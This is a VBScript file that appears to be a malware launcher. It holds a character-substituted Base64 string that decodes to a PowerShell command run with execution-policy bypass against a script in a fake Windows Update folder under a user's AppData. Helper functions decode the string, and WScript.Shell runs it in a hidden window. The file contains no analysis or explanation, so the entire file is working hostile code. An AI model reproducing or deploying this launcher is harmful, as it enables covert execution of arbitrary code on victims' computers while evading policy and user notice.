xxx = "cG93ZXJz@GVsbC5leGUgLUV4ZWMgQnlwYXNzIEM6XFVzZXJzXEtMWVxBc-BEYXRhXExvY2FsXE1pY3Jvc29mdFxX@W5kb3dzXFVwZGF0ZVxTY3Jpc-Quc-Mx"
Private Function Stream_BinaryToString(Binary)
  Const adTypeText = 2
  Const adTypeBinary = 1
  Set BinaryStream = CreateObject("ADODB.Stream")
  BinaryStream.Type = adTypeBinary
  BinaryStream.Open
  BinaryStream.Write Binary
  BinaryStream.Position = 0
  BinaryStream.Type = adTypeText
  BinaryStream.CharSet = "us-ascii"
  Stream_BinaryToString = BinaryStream.ReadText
  Set BinaryStream = Nothing
End Function
Function Base64Decode(ByVal vCode)
  vCode = Replace(vCode, "@", "a")
  vCode = Replace(vCode, "-", "H")
  vCode = Replace(vCode, "$", "S")
  Dim oXML, oNode
  Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
  Set oNode = oXML.CreateElement("base64")
  oNode.DataType = "bin.base64"
  oNode.text = vCode
  Base64Decode = Stream_BinaryToString(oNode.nodeTypedValue)
  Set oNode = Nothing
  Set oXML = Nothing
End Function

Set objShell = CreateObject("WScript.Shell")
objShell.Run (Base64Decode(xxx)), 0, False
